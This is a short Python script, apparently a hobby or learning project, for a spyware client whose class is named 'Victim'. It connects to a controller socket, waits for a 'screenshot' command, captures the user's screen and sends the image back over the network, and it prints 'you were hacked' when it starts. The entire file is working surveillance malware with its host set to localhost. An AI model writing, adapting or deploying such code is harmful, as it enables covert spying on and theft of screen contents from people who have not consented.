##AUTOR: GUSTAVO ANDRE

from datetime import datetime

import socket
import pyscreenshot as ImageGrab



class Victim:
    def __init__(self):

        host = "127.0.0.1"
        port = 3500

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))

    

    def screenshot(self):
        imagem = ImageGrab.grab()
        imagem.save('screenshot.png', 'png')


    def send_screenshot(self):
        file_b = open("screenshot.png", "rb").read()

        now_date = datetime.now().strftime('%Y-%m-%d %Hh%M')
        print(now_date)

        self.s.send(str(len(file_b)).encode())
        self.s.send(now_date.encode())
        count_byte = 0
        while count_byte < len(file_b):
            
            self.s.send(file_b[count_byte:count_byte+1024])
            count_byte += 1024
    
    def recv_command(self):
        while True:
            data = self.s.recv(1024).decode("utf-8")
            if(data == "screenshot"):
                self.screenshot()
                self.send_screenshot()

if __name__ == "__main__":

    print("you were hacked")
    client = Victim()
    client.recv_command()